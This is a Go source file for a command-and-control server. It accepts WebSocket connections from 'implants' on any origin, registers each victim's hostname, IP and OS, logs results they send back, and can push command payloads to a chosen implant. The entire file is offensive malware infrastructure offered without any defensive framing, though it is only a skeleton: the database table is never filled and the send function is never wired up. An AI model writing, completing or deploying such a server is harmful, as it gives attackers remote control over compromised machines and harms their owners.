package main

import (
	"database/sql"
	"encoding/json"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	_ "github.com/mattn/go-sqlite3"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

type Implant struct {
	ID        string
	Hostname  string
	IP        string
	OS        string
	LastSeen  time.Time
	Conn      *websocket.Conn
}

type Command struct {
	ID      string `json:"id"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
}

var (
	implantMap = make(map[string]*Implant)
	mu         sync.Mutex
	db         *sql.DB
)

func main() {
	var err error
	db, err = sql.Open("sqlite3", "c2.db")
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	_, _ = db.Exec(`CREATE TABLE IF NOT EXISTS implants (id TEXT PRIMARY KEY, hostname TEXT, ip TEXT, os TEXT, last_seen TEXT)`)

	http.HandleFunc("/ws", handleWS)
	http.Handle("/", http.FileServer(http.Dir("dashboard/dist")))

	log.Println("C2 Server running on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func handleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	var initData map[string]string
	conn.ReadJSON(&initData)

	id := initData["id"]
	if id == "" {
		id = "implant-" + time.Now().Format("20060102150405")
	}

	mu.Lock()
	implant := &Implant{ID: id, Hostname: initData["hostname"], IP: initData["ip"], OS: initData["os"], LastSeen: time.Now(), Conn: conn}
	implantMap[id] = implant
	mu.Unlock()

	log.Printf("Implant connected: %s", id)

	for {
		var msg map[string]interface{}
		err := conn.ReadJSON(&msg)
		if err != nil {
			mu.Lock()
			delete(implantMap, id)
			mu.Unlock()
			break
		}

		if cmdType, ok := msg["type"].(string); ok && cmdType == "result" {
			log.Printf("Result from %s: %v", id, msg["data"])
		}
	}
}

func SendCommand(implantID, cmdType, payload string) {
	mu.Lock()
	implant, exists := implantMap[implantID]
	mu.Unlock()
	if !exists {
		return
	}

	cmd := Command{ID: "cmd-" + time.Now().Format("20060102150405"), Type: cmdType, Payload: payload}
	implant.Conn.WriteJSON(cmd)
}
